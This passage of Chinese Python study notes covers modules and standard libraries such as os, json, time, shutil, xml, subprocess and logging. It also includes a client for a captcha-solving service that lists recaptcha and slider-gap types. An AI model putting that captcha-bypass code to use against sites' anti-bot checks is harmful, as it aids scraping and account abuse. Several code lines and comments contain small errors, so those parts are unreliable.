## 可以在函数内导入模块
```

### 18-2 写模块时测试

```python
# 每个Python文件内置了__name__,指向Python文件名

# 当foo.py 被运行时， 
__name__  =  "__main__"

# 当foo.py 被当做模块导入时，
__name__ != "__main__"

##### 测试时可以if判断,在foo.py文件中写以下判断
if __name__ == "__main__" :
    ##  你的测试代码
```

### 18-3 from xxx import xxx

```python
# from foo import x 发生什么事情
1， 产生一个模块的命名空间
2， 运行foo.py 产生，将运行过程中产生的名字都丢到命名空间去
3， 在当前命名空间拿到一个名字，改名字指向模块命名空间
```

### 18-4  从一个模块导入所有

```Python
#不太推荐使用
form foo import *  
# 被导入模块有个 __all__ = []
__all__ = []   # 存放导入模块里的所有变量和函数， 默认放所有的变量和函数，也可以手动修改


foo.py
    __all__ = ['x','change']
    x = 10
    def change():
        global x
        x = 20
    a = 20
    b = 30
    
run.py    
    from foo import *  ## * 导入的是foo.py里的 __all__ 列表里的变量和函数
    print(x)
    change()
    print(a)  # 会报错，因为foo.py 里的 __all__ 列表里没有a变量
```

### 18-5  sys.path 模块搜索路径优先级

```python
1， 内存（内置模块）
2， 从硬盘查找

import sys
# 值为一个列表，存放了一系列的文件夹
# 其中第一个文件夹是当前执行所在的文件夹
# 第二个文件夹当不存在，因为这不是解释器存放的，是pycharm添加的
print(sys.path)
# sys.path 里放的就是模块的存放路径查找顺序
[
'E:\\Desktop\\python全栈\\模块', 'E:\\Desktop\\python全栈', 'D:\\软件\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_display', 'D:\\软件\\python\\python310.zip', 'D:\\软件\\python\\DLLs', 'D:\\软件\\python\\lib', 'D:\\软件\\python', 'C:\\Users\\艾尼-aini\\AppData\\Roaming\\Python\\Python310\\site-packages', 'D:\\软件\\python\\lib\\site-packages', 'D:\\软件\\python\\lib\\site-packages\\win32', 'D:\\软件\\python\\lib\\site-packages\\win32\\lib', 'D:\\软件\\python\\lib\\site-packages\\Pythonwin', 'D:\\软件\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_matplotlib_backend'
]
```

### 18-6  sys.modules 查看内存中的模块

```python
import sys
print(sys.module)   # 是一个字典，存放导入的模块

## 可以判断一个模块是否已经在内存中
print('foo' in sys.module)

```

### 18-7  编写规范的模块

```python
"this module is used to ......"    # 第一行文档注释
import sys  # 导入需要用到的包
x = 1  # 定义全局变量
class foo:    # 定义类
 	pass
def test():  #定义函数
    pass

if __name__ == "__main__":
    pass
```

# 二，常用库(共15个)

## 1，os模块

```python
import os
# 判断文件是否存在
os.path.exists()  #  判断文件或者文件夹是否存在，返回布尔值

os.path.join()    # 路径拼接
os.path.join(path1,path2,path3)

os.makedirs()     # 创建文件夹




os.getcwd()  # 获取当前工作目录，即当前python脚本工作的目录路径
os.chdir("dirname")  # 改变当前脚本工作目录；相当于shell下cd
os.curdir  # 返回当前目录: ('.')
os.pardir  # 获取当前目录的父目录字符串名：('..')
os.makedirs('dirname1/dirname2')    # 可生成多层递归目录
os.removedirs('dirname1')    # 若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推
os.mkdir('dirname')    # 生成单级目录；相当于shell中mkdir dirname
os.rmdir('dirname')    # 删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname
os.listdir('dirname')    # 列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印
os.remove()  # 删除一个文件
os.rename("oldname","newname")  # 重命名文件/目录
os.stat('path/filename')  # 获取文件/目录信息
os.sep    # 输出操作系统特定的路径分隔符，win下为"\\",Linux下为"/"
os.linesep    # 输出当前平台使用的行终止符，win下为"\t\n",Linux下为"\n"
os.pathsep    # 输出用于分割文件路径的字符串 win下为;,Linux下为:
os.name    # 输出字符串指示当前使用平台。win->'nt'; Linux->'posix'
os.system("bash command")  # 运行shell命令，直接显示
os.environ  # 获取系统环境变量
os.path.abspath(path)  # 返回path规范化的绝对路径
os.path.split(path)  # 将path分割成目录和文件名二元组返回
os.path.dirname(path)  # 返回path的目录。其实就是os.path.split(path)的第一个元素
os.path.basename(path)  # 返回path最后的文件名。如何path以／或\结尾，那么就会返回空值。即os.path.split(path)的第二个元素

os.path.exists(path)  # 如果path存在，返回True；如果path不存在，返回False
os.path.isabs(path)  # 如果path是绝对路径，返回True
os.path.isfile(path)  # 如果path是一个存在的文件，返回True。否则返回False
os.path.isdir(path)  #如果path是一个存在的目录，则返回True。否则返回False
os.path.join(path1[, path2[, ...]])  # 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略
os.path.getatime(path)  # 返回path所指向的文件或者目录的最后存取时间
os.path.getmtime(path)  # 返回path所指向的文件或者目录的最后修改时间
os.path.getsize(path) # 返回path的大小
```

## 2，json模块

```python
## JSON格式兼容的是所有语言通用的数据类型，不能支持单一数据类型

# JSON ---------字典
dic = json.loads(s)

# 字典-----------JSON
s = json.dumps(dic)

import json
## 有时保存下来的中文数据打开后发现变成ASCII码，这是需要将ensure_ascii参数设置成False
    data = {
        'name' : 'name',
        'age' : 20,
    }
    json_str = json.dumps(data,ensure_ascii=False)

# josn.dump
    data = {
        'name':'name',
        'age':20,
    }
    #讲python编码成json放在那个文件里
    filename = 'a.txt'
    with open (filename,'w') as f:
        json.dump(data ,f)

## json.load    
    data  = {
        'name':'name',
        'age':20
    }
    filename = 'a.txt'
    with open (filename,'w') as f:
        json.dump(data,f)
    with open (filename) as f_:
        print(json.load(f_))


```



![image-20230629122312231](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230629122312231.png)



### 2.1 猴子补丁S

```python
### 在入扣文件处进行猴子补丁
import json
import ujson

def monkey_patch_json():
    json.__name__ = 'ujson'
    json.dumps = ujson.dumps
    json.loads = ujson.loads
    
monkey_patch_json()
```



## 3，random模块

```python 
a = random.choice('abcdefghijklmn')  # 参数也可以是个列表

a = "abcdefghijklmnop1234567890"
b = random.sample(a,3)   # 随机取三个值，返回一个列表

num = random.randint(1,100)


1，random.random()   # 得到的是 0----1 之间的小数 -------------- 0.6400374661599008
2，random.randint(1,3) # 范围是  [1,3]  包头包尾
3，random.randrange(1,2) # 范围是 [1,3)  顾头不顾尾
4，random.chioce('abcdefghijklmn')  # 参数也可以是个列表
5，random.sample(['a','b','c','d'],3)  # 随机取三个值，返回一个列表

6，random.uniform(1,3)  # 得到 1-------3 之间的浮点数

item = [1,2,3,4,5,6,7,8,9]
7，random.shuffle(item) # 洗牌，打乱顺序  [4, 1, 2, 9, 7, 5, 6, 3, 8]
```

## 4，string模块

```python
string.ascii_letters  # 返回小写字母大写字母字符串
# 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

string.ascii_uppercase # 返回大写字母的字符串
# 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

string.ascii_lowercase # 返回小写字母的字符串
# 'abcdefghijklmnopqrstuvwxyz'

string.punctuation # 打印特殊字符
# '!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~'

string.digits  # 打印数字
# '0123456789'
```

## 5，异常处理

### 5.1 错误类型

```python
## 语法错误 SyntaxError
## 逻辑错误 NameError  IndexError  ZeroDivisionError ValueError


## 一种是语法上的错误SyntaxError，这种错误应该在程序运行前就修改正确
 if  
  File "<stdin>", line 1
    if
     ^
SyntaxError: invalid syntax

# -------------------------------------------------------------------------------------------
# TypeError：数字类型无法与字符串类型相加
1+’2’

# ValueError：当字符串包含有非数字的值时，无法转成int类型
    num=input(">>: ") #输入hello
    int(num)

# NameError：引用了一个不存在的名字x
	x

# IndexError：索引超出列表的限制
    l=['egon','aa']
    l[3]

# KeyError：引用了一个不存在的key
    dic={'name':'egon'}
    dic['age']

# AttributeError：引用的属性不存在
    class Foo:
        pass
    Foo.x

# ZeroDivisionError：除数不能为0
	1/0
```

### 5.1 逻辑错误两种处理方式

#### 5.1.1 错误时可以预知的

```python
age = input(">>:").strip()

if age.isdigit():  ## 可以用if 判断避免错误出现
    age = int(age)  ## age必须是数字，才能转换为int类型
    if age > 18:
        print("猜大了")
    else:
        print('猜小了')
```

#### 5.1.2 错误时不可预知的

```python
## 只要抛出异常同级别的代码不会往下运行

try:
    ##有可能抛出异常的子代码块
 
except 异常类型1 as e:
    pass
except 异常类型2 as e:
    pass

....
else:
    ## 如果被检测的子代码块没有异常发生则运行else
finally:
    ## 无论有没有异常发生都会运行此代码

## --------------------------------------------------------------------------------------------

## 用法一
try:
	print('11111111111')
	l = ['aaa','bbbb']
	l[3]  ## 抛出异常IndexError，该码块同级别的后续代码不会运行
	print('222222222222222')
	xxx
	print('3333333333333333333')
	dic = {'a':1}
	dic['a']
	print('end')
except IndexError as e:
	print('异常处理了')
	print(e)
except NameError as e:
	print('异常处理了')
	print(e)
  ## --------------------------------------------------------------------------------------
# 用法二

print('start')
try:
	print('11111111111')
	l = ['aaa','bbbb']
	l[3]  ## 抛出异常IndexError，该码块同级别的后续代码不会运行
	print('222222222222222')
	# xxx
	print('3333333333333333333')
	dic = {'a':1}
	dic['a']
	print('end')
except (IndexError,NameError) as e:
	print('异常处理了')
except KeyError as e:
	print('字典的key不存在',e)

    ## ------------------------------------------------------------------------------------------
## 用法三
## 万能异常
    
print('start')
try:
	print('11111111111')
	l = ['aaa','bbbb']
	l[3]  ## 抛出异常IndexError，该码块同级别的后续代码不会运行
	print('222222222222222')
	# xxx
	print('3333333333333333333')
	dic = {'a':1}
	dic['a']
	print('end')
except Exception as e:  ## 万能异常，都能匹配上
	print('万能异常')
## ----------------------------------------------------------------------------------------

## 方法四
##tyr 不能跟 else 连用

try:
	print('11111111111111')
	print('33333333333')
	print('2222222222222222222')
except Exception as e:
	print('所有异常都能匹配到')
else:
	print('==============>')

print('end...........')

## ------------------------------------------------------------------------------------------

## 方法五
## finally 可以单独与try配合使用

print('start')
try:
	print('11111111111')
	l = ['aaa','bbbb']
	l[3]  ## 抛出异常IndexError，该码块同级别的后续代码不会运行
	print('222222222222222')
	xxx
	print('3333333333333333333')
	dic = {'a':1}
	dic['a']
	print('end')
finally:  
    ## 应该把被检测代码中，回收系统化资源的代码放这里
	print('我不处理异常，无论是否发生异常我都会运行')
```

## 6，打码平台使用

```python
import base64
import json
import requests
def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ''


if __name__ == "__main__":
    img_path = "./code.png"
    result = base64_api(uname='xxxxx', pwd='xxxxx', img=img_path, typeid=3)
    print(result)
        
import base64
import json
import requests
# 一、图片文字类型(默认 3 数英混合)：
# 1 : 纯数字
# 1001：纯数字2
# 2 : 纯英文
# 1002：纯英文2
# 3 : 数英混合
# 1003：数英混合2
#  4 : 闪动GIF
# 7 : 无感学习(独家)
# 11 : 计算题
# 1005:  快速计算题
# 16 : 汉字
# 32 : 通用文字识别(证件、单据)
# 66:  问答题
# 49 :recaptcha图片识别
# 二、图片旋转角度类型：
# 29 :  旋转类型
#
# 三、图片坐标点选类型：
# 19 :  1个坐标
# 20 :  3个坐标
# 21 :  3 ~ 5个坐标
# 22 :  5 ~ 8个坐标
# 27 :  1 ~ 4个坐标
# 48 : 轨迹类型
#
# 四、缺口识别
# 18 : 缺口识别（需要2张图 一张目标图一张缺口图）
# 33 : 单缺口识别（返回X轴坐标 只需要1张图）
# 五、拼图识别
# 53：拼图识别
def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ""


if __name__ == "__main__":
    img_path = "C:/Users/Administrator/Desktop/file.jpg"
    result = base64_api(uname='你的账号', pwd='你的密码', img=img_path, typeid=3)
    print(result)
```

## 7，时间模块

### 7.1 time 模块

```python
import time

# 时间戳 ： 从1970年到现在经过的秒数
time.time()     # 时间戳---------用于计算

# 按照某种格式显示时间： 2020-03-30 11:11:11 AM || PM
time.strftime('%Y-%m-%d %H:%M:%S %p')  # 2023-06-27 14:24:38 PM
time.strftime('%Y-%m-%d %X')    # 2023-06-27 14:24:38


#结构化时间
res = time.localtime()  ## --------------获取年月日
print(res)   ## time.struct_time(tm_year=2023, tm_mon=6, tm_mday=27, tm_hour=14, tm_min=26, tm_sec=17, tm_wday=1, 				tm_yday=178, tm_isdst=0)

print(res.tm_year)  ## 年
print(res.tm_mon)   ## 月
print(res.tm_mday)  ## 日
print(res.tm_hour)  ## 小时
print(res.tm_min)   ## 分钟
print(res.tm_sec)   ## 秒
print(res.tm_wday)
print(res.tm_yday)
print(res.tm_isdst)

```

### 7.2 datetime 模块

```python
import datetime

datetime.datetime.now() ##  2023-06-27 14:38:31.929938

datetime.datetime.now() + datetime.timedelta(days = 3)  ## 三天后的时间  2023-06-30 14:40:55.794329
# 参数有  days || secondes || weeks || hours || minutes
# days = 3 || -3   参数可以 为负数

```

### 7.3 时间格式的转换

```python
import time


1，时间戳 <-----------------> 结构化时间
    # 结构化时间 -------------------------> 时间戳
        s_time = time.localtime()  # 结构化时间
        res = time.mktime(s_time)
        print(res)   # 1687848357.0

    # 时间戳 ---------------------------------> 结构化时间
        tp_time = time.time()
        res = time.localtime(tp_time)
        print(res) # time.struct_time(tm_year=2023, tm_mon=6, tm_mday=27, tm_hour=14, tm_min=48, tm_sec=36, 						tm_wday=1,tm_yday=178, tm_isdst=0)	
    # 时间戳 --------------------------------> 世界标准时间 --------- 跟本地时间差8小时
        tp_time = time.time()
        res = time.gmtime(tp_time)
        print(res)  # time.struct_time(tm_year=2023, tm_mon=6, tm_mday=27, tm_hour=6, tm_min=50, tm_sec=35, 						tm_wday=1,tm_yday=178, tm_isdst=0)
        
 2, 结构化 <-------------------------> 格式化时间
	## time.strptime('%Y-%m-%d %H:%M:%S %p',time.localtime())
	res =  time.strptime('1988-03-03 11:11:11','%Y-%m-%d %H:%M:%S')
    print(res)
    ## time.struct_time(tm_year=1988, tm_mon=3, tm_mday=3, tm_hour=11, tm_min=11, tm_sec=11, tm_wday=3, tm_yday=63, 		tm_isdst=-1)
    
    '1988-03-03 11:11:11' + 7  -----------------------> 结构化时间
    s_time = time.strptime('1988-03-03 11:11:11','%Y-%m-%d %H:%M:%S') # 结构化时间
 	miao = time.mktime(s_time) + 7 * 86400  ## 得到时间戳
    
    struct_time = time.localtime(miao) ##  得到结构化时间
    res = time.strftime('%Y-%m-%d %X',time.localtime(miao)) # 格式化时间
    print(res)   # 1988-03-10 11:11:11
    
    
```

### 7.4 ，了解

```python
import time
## linix 操作系统上常见
print(time.asctime())  # Tue Jun 27 15:26:23 2023
```

## 8, sys模块

```python
1 sys.argv           # 命令行参数List，第一个元素是程序本身路径，用于获取终端里的参数
2 sys.exit(n)        # 退出程序，正常退出时exit(0)
3 sys.version        # 获取Python解释程序的版本信息
4 sys.maxint         # 最大的Int值
5 sys.path           # 返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值
6 sys.platform       # 返回操作系统平台名称
```

### 8.1 打印进度条

```python
import time

def process():
	recv_size = 0
	total_size = 333333
	
	while recv_size < total_size:
		# 下载了1024个字节数据
		time.sleep(0.05)
		recv_size += 1024
        if recv_size > total_size:
			recv_size = total_size
		percent = recv_size / total_size
		res = int(50 * percent) * "#"
		# 打印进度条
		print('\r[%-50s] %d%%' % (res,100 * percent) ,end='')


process()

## [##################################################] 100%
```

## 9，shutii 模块

```python
import shutill

# 将文件内容拷贝到另一个文件中
shutil.copyfileobj(open('old.xml','r'), open('new.xml', 'w'))
    
# 仅拷贝权限。内容、组、用户均不变
shutil.copymode('f1.log', 'f2.log')   #目标文件必须存在

# 拷贝文件
shutil.copyfile('f1.log', 'f2.log') #目标文件无需存在

# 仅拷贝状态的信息，包括：mode bits, atime, mtime, flags
shutil.copystat('f1.log', 'f2.log') #目标文件必须存在

# 拷贝文件和权限
shutil.copy('f1.log', 'f2.log')

# 拷贝文件和状态信息
shutil.copy2('f1.log', 'f2.log')

# 递归的去拷贝文件夹

shutil.copytree('folder1', 'folder2', ignore=shutil.ignore_patterns('*.pyc', 'tmp*')) 
# 目标目录不能存在，注意对folder2目录父级目录要有可写权限，ignore的意思是排除

shutil.copytree('f1', 'f2', symlinks=True, ignore=shutil.ignore_patterns('*.pyc', 'tmp*'))
'''
通常的拷贝都把软连接拷贝成硬链接，即对待软连接来说，创建新的文件
'''

#递归的去删除文件
shutil.rmtree('folder1')

#递归的去移动文件，它类似mv命令，其实就是重命名。
shutil.move('folder1', 'folder3')

# 创建压缩包并返回文件路径，例如：zip、tar
# 创建压缩包并返回文件路径，例如：zip、tar

base_name： 压缩包的文件名，也可以是压缩包的路径。只是文件名时，则保存至当前目录，否则保存至指定路径，
    # 如 data_bak  =>保存至当前路径
    # 如：/tmp/data_bak =>保存至/tmp/
format： 压缩包种类，“zip”, “tar”, “bztar”，“gztar”
root_dir： 要压缩的文件夹路径（默认当前目录）
owner： 用户，默认当前用户
group： 组，默认当前组
logger： 用于记录日志，通常是logging.Logger对象


#将 /data 下的文件打包放置当前程序目录
ret = shutil.make_archive("data_bak", 'gztar', root_dir='/data')

#将 /data下的文件打包放置 /tmp/目录
ret = shutil.make_archive("/tmp/data_bak", 'gztar', root_dir='/data') 


#shutil 对压缩包的处理是调用 ZipFile 和 TarFile 两个模块来进行的，详细：
import zipfile
    # 压缩
        z = zipfile.ZipFile('laxi.zip', 'w')
        z.write('a.log')
        z.write('data.data')
        z.close()

    # 解压
        z = zipfile.ZipFile('laxi.zip', 'r')
        z.extractall(path='.')
        z.close()


import tarfile
   # 压缩
       t=tarfile.open('/tmp/egon.tar','w')
       t.add('/test1/a.py',arcname='a.bak')
       t.add('/test1/b.py',arcname='b.bak')
       t.close()


    # 解压
        t=tarfile.open('/tmp/egon.tar','r')
        t.extractall('/egon')
        t.close()
```

## 10，pickle模块(有兼容性问题，了解就行)

```python
import pickle

res = pickle.dumps({1,2,3,4,5})
print(res)
# b'\x80\x04\x95\x0f\x00\x00\x00\x00\x00\x00\x00\x8f\x94(K\x01K\x02K\x03K\x04K\x05\x90.'

res = pickle.loads(res)
print(res)
# {1, 2, 3, 4, 5}

# coding:utf-8
import pickle

with open('a.pkl',mode='wb') as f:
    # 一：在python3中执行的序列化操作如何兼容python2
    # python2不支持protocol>2，默认python3中protocol=4
    # 所以在python3中dump操作应该指定protocol=2
    pickle.dump('你好啊',f,protocol=2)

with open('a.pkl', mode='rb') as f:
    # 二：python2中反序列化才能正常使用
    res=pickle.load(f)
    print(res)

```

## 11，xml模块

```python
<?xml version="1.0"?>
<data>
    <country name="Liechtenstein">
        <rank updated="yes">2</rank>
        <year>2008</year>
        <gdppc>141100</gdppc>
        <neighbor name="Austria" direction="E"/>
        <neighbor name="Switzerland" direction="W"/>
    </country>
    <country name="Singapore">
        <rank updated="yes">5</rank>
        <year>2011</year>
        <gdppc>59900</gdppc>
        <neighbor name="Malaysia" direction="N"/>
    </country>
    <country name="Panama">
        <rank updated="yes">69</rank>
        <year>2011</year>
        <gdppc>13600</gdppc>
        <neighbor name="Costa Rica" direction="W"/>
        <neighbor name="Colombia" direction="E"/>
    </country>
</data>


xml协议在各个语言里的都 是支持的，在python中可以用以下模块操作xml：
# print(root.iter('year')) #全文搜索
# print(root.find('country')) #在root的子节点找，只找一个
# print(root.findall('country')) #在root的子节点找，找所有

import xml.etree.ElementTree as ET
 
tree = ET.parse("xmltest.xml")
root = tree.getroot()
print(root.tag)
 
#遍历xml文档
    for child in root:
        print('========>',child.tag,child.attrib,child.attrib['name'])
        for i in child:
            print(i.tag,i.attrib,i.text)

    #只遍历year 节点
    for node in root.iter('year'):
        print(node.tag,node.text)
#---------------------------------------

import xml.etree.ElementTree as ET
 
tree = ET.parse("xmltest.xml")
root = tree.getroot()
 
#修改
    for node in root.iter('year'):
        new_year=int(node.text)+1
        node.text=str(new_year)
        node.set('updated','yes')
        node.set('version','1.0')
    tree.write('test.xml')
 
 
#删除node
    for country in root.findall('country'):
       rank = int(country.find('rank').text)
       if rank > 50:
         root.remove(country)

    tree.write('output.xml')

#在country内添加（append）节点year2
    import xml.etree.ElementTree as ET
    tree = ET.parse("a.xml")
    root=tree.getroot()
    for country in root.findall('country'):
        for year in country.findall('year'):
            if int(year.text) > 2000:
                year2=ET.Element('year2')
                year2.text='新年'
                year2.attrib={'update':'yes'}
                country.append(year2) #往country节点下添加子节点

    tree.write('a.xml.swap')



自己创建xml文档：
    import xml.etree.ElementTree as ET

    new_xml = ET.Element("namelist")
    name = ET.SubElement(new_xml,"name",attrib={"enrolled":"yes"})
    age = ET.SubElement(name,"age",attrib={"checked":"no"})
    sex = ET.SubElement(name,"sex")
    sex.text = '33'
    name2 = ET.SubElement(new_xml,"name",attrib={"enrolled":"no"})
    age = ET.SubElement(name2,"age")
    age.text = '19'

    et = ET.ElementTree(new_xml) #生成文档对象
    et.write("test.xml", encoding="utf-8",xml_declaration=True)

    ET.dump(new_xml) #打印生成的格式
```

## 12，configparser模块（导入某种格式的配置文件）

```Python
## 配置文件内容

[section1]
k1 = v1
k2:v2
user=egon
age=18
is_admin=true
salary=31

[section2]
k1 = v1

```

### 12.1 读取

```Python
import configparser

config=configparser.ConfigParser()
config.read('a.cfg') # 读取配置文件

#查看所有的标题
res=config.sections() #['section1', 'section2']
print(res)

#查看标题section1下所有key=value的key
options=config.options('section1')
print(options) #['k1', 'k2', 'user', 'age', 'is_admin', 'salary']

#查看标题section1下所有key=value的(key,value)格式
item_list=config.items('section1')
print(item_list) 
#[('k1', 'v1'), ('k2', 'v2'), ('user', 'egon'), ('age', '18'), ('is_admin', 'true'), ('salary', '31')]

#查看标题section1下user的值=>字符串格式
val=config.get('section1','user')
print(val) #egon

#查看标题section1下age的值=>整数格式
val1=config.getint('section1','age')
print(val1) #18

#查看标题section1下is_admin的值=>布尔值格式
val2=config.getboolean('section1','is_admin')
print(val2) #True

#查看标题section1下salary的值=>浮点型格式
val3=config.getfloat('section1','salary')
print(val3) #31.0

```



### 12.2  改写

```python
import configparser

config=configparser.ConfigParser()
config.read('a.cfg',encoding='utf-8')


#删除整个标题section2
config.remove_section('section2')

#删除标题section1下的某个k1和k2
config.remove_option('section1','k1')
config.remove_option('section1','k2')

#判断是否存在某个标题
print(config.has_section('section1'))

#判断标题section1下是否有user
print(config.has_option('section1',''))


#添加一个标题
config.add_section('egon')

#在标题egon下添加name=egon,age=18的配置
config.set('egon','name','egon')
config.set('egon','age',18) #报错,必须是字符串


#最后将修改的内容写入文件,完成最终的修改
config.write(open('a.cfg','w'))
```

## 13 hashlib 模块

```Python
# hash是一类算法，该算法根据传入的内容，经过运算得到一串哈希值

# hash值的特单
	1，传入的内容一样，则得到的结果一样
    2，无论传多大内容，得到的hash值长度一样
    3，不能反向破解
```

## 14  subprocess模块

```python
import subprocess 
 '''
 sh-3.2# ls /Users/egon/Desktop |grep txt$
 mysql.txt
 tt.txt
 事物.txt
 '''
## 查看 /Users/jieli/Desktop 下的文件列表
res1=subprocess.Popen('ls /Users/jieli/Desktop',shell=True,stdout=subprocess.PIPE，stderr=subprocess.PIPE)
# shell = True 意思是调一个终端  stdout 是正确结果的输出管道   stderr 是接受错误结果的输出管道
# res1 是对象
print(res2.stdout.read()) # 打印正确的结果，得到的格式是字节，解码用的是系统的编码格式,mac为utf-8
print(res1.stderr.read()) # 打印错误的结果，得到的是字节格式，解码用的是系统的编码格式，windows为gbk

res=subprocess.Popen('grep txt$',shell=True,stdin=res1.stdout,stdout=subprocess.PIPE)
print(res.stdout.read().decode('utf-8'))


#等同于上面,但是上面的优势在于,一个数据流可以和另外一个数据流交互,可以通过爬虫得到结果然后交给grep
res1=subprocess.Popen('ls /Users/jieli/Desktop |grep txt$',shell=True,stdout=subprocess.PIPE)
print(res1.stdout.read().decode('utf-8'))

#windows下:
# dir | findstr 'test*'
# dir | findstr 'txt$'

import subprocess
res1=subprocess.Popen(r'dir C:\Users\Administrator\PycharmProjects\test\函数备课',shell=True,stdout=subprocess.PIPE)
res=subprocess.Popen('findstr test*',shell=True,stdin=res1.stdout,
                 stdout=subprocess.PIPE)

print(res.stdout.read().decode('gbk')) #subprocess使用当前系统默认编码，得到结果为bytes类型，在windows下需要用gbk解码
```

## 15，日志模块（logging）

### 14.1 日志级别

```python
import logging

CRITICAL = 50 #FATAL = CRITICAL
ERROR = 40
WARNING = 30 #WARN = WARNING
INFO = 20
DEBUG = 10
NOTSET = 0 #不设置
```

### 14.2 默认级别为warning，默认打印到终端

```python
import logging

logging.debug('调试debug')
logging.info('消息info')
logging.warning('警告warn')  ## WARNING:root:警告warn
logging.error('错误error')  ## ERROR:root:错误error
logging.critical('严重critical')  ## CRITICAL:root:严重critical

'''
WARNING:root:警告warn
ERROR:root:错误error
CRITICAL:root:严重critical
'''
```

### 14.3 为logging模块指定全局配置，针对所有logger有效，控制打印到文件中

```python
'''
可在logging.basicConfig()函数中可通过具体参数来更改logging模块默认行为，可用参数有

    filename：用指定的文件名创建FiledHandler（后边会具体讲解handler的概念），这样日志会被存储在指定的文件中。
    filemode：文件打开方式，在指定了filename时使用这个参数，默认值为“a”还可指定为“w”。
    format：指定handler使用的日志显示格式。
    datefmt：指定日期时间格式。
    level：设置rootlogger（后边会讲解具体概念）的日志级别
    stream：用指定的stream创建StreamHandler。可以指定输出到sys.stderr,sys.stdout或者文件，默认为sys.stderr。若同时列出了			filename和stream两个参数，则stream参数会被忽略。
'''
## 例如：
logging.basicConfig(
	format = '%(asctime)s -  %(name)s - %(levelname)s - %(module)s' # 就这样自定义格式
)
format参数中可能用到的格式化串：
%(name)s # Logger的名字
%(levelno)s # 数字形式的日志级别
%(levelname)s # 文本形式的日志级别
%(pathname)s # 调用日志输出函数的模块的完整路径名，可能没有
%(filename)s # 调用日志输出函数的模块的文件名
%(module)s # 调用日志输出函数的模块名
%(funcName)s # 调用日志输出函数的函数名
%(lineno)d # 调用日志输出函数的语句所在的代码行
%(created)f # 当前时间，用UNIX标准的表示时间的浮 点数表示
%(relativeCreated)d # 输出日志信息时的，自Logger创建以 来的毫秒数
%(asctime)s # 字符串形式的当前时间。默认格式是 “2003-07-08 16:49:45,896”。逗号后面的是毫秒
%(thread)d # 线程ID。可能没有
%(threadName)s # 线程名。可能没有
%(process)d # 进程ID。可能没有
%(message)s # 用户输出的消息
```

### 14.4 使用例子

```Python
#========使用

import logging
logging.basicConfig(
    ## 写到文件里的编码格式以系统编码格式为准，Windows为gbk
    filename='access.log',  ## 日志输出的位置
    format='%(asctime)s - %(name)s - %(levelname)s -%(module)s:  %(message)s', ## 一个日志输出的格式
    datefmt='%Y-%m-%d %H:%M:%S %p', ## 输出里的时间格式
    level=10  ## 日志错误级别
)

logging.debug('调试debug')
logging.info('消息info')
logging.warning('警告warn')
logging.error('错误error')
logging.critical('严重critical')

#========结果
access.log内容:
2017-07-28 20:32:17 PM - root - DEBUG -test:  调试debug
2017-07-28 20:32:17 PM - root - INFO -test:  消息info
2017-07-28 20:32:17 PM - root - WARNING -test:  警告warn
2017-07-28 20:32:17 PM - root - ERROR -test:  错误error
2017-07-28 20:32:17 PM - root - CRITICAL -test:  严重critical
```

### 14.5   logging模块的Formatter，Handler，Logger，Filter对象

```python
#logger：产生日志的对象
#Filter：过滤日志的对象
#Handler：接收日志然后控制打印到不同的地方，FileHandler用来打印到文件中，StreamHandler用来打印到终端
#Formatter对象：可以定制不同的日志格式对象，然后绑定给不同的Handler对象使用，以此来控制不同的Handler的日志格式

'''
critical=50
error =40
warning =30
info = 20
debug =10
'''


import logging

#1、logger对象：负责产生日志，然后交给Filter过滤，然后交给不同的Handler输出
logger=logging.getLogger(__file__)

#2、Filter对象：不常用，略

#3、Handler对象：接收logger传来的日志，然后控制输出
h1=logging.FileHandler('t1.log') #打印到文件
h2=logging.FileHandler('t2.log') #打印到文件
h3=logging.StreamHandler() #打印到终端

#4、Formatter对象：日志格式
formmater1=logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s -%(module)s:  %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S %p',
)

formmater2=logging.Formatter(
    '%(asctime)s :  %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S %p',
)

formmater3=logging.Formatter('%(name)s %(message)s',)


#5、为Handler对象绑定格式
h1.setFormatter(formmater1)
h2.setFormatter(formmater2)
h3.setFormatter(formmater3)

#6、将Handler添加给logger并设置日志级别
logger.addHandler(h1)
logger.addHandler(h2)
logger.addHandler(h3)
logger.setLevel(10)

#7、测试
logger.debug('debug')
logger.info('info')
logger.warning('warning')
logger.error('error')
logger.critical('critical')
```

### 14.6 Logger与Handler的级别

```python
### logger是第一级过滤，然后才能到handler，我们可以给logger和handler同时设置level


#验证
import logging

form=logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s -%(module)s:  %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S %p',
)

ch=logging.StreamHandler()

ch.setFormatter(form)
# ch.setLevel(10)
ch.setLevel(20)

l1=logging.getLogger('root')
# l1.setLevel(20)
l1.setLevel(10)
l1.addHandler(ch)

l1.debug('l1 debug')
```

### 14.7  Logger的继承（了解）

```python
import logging

formatter=logging.Formatter('%(asctime)s - %(name)s - %(levelname)s -%(module)s:  %(message)s',
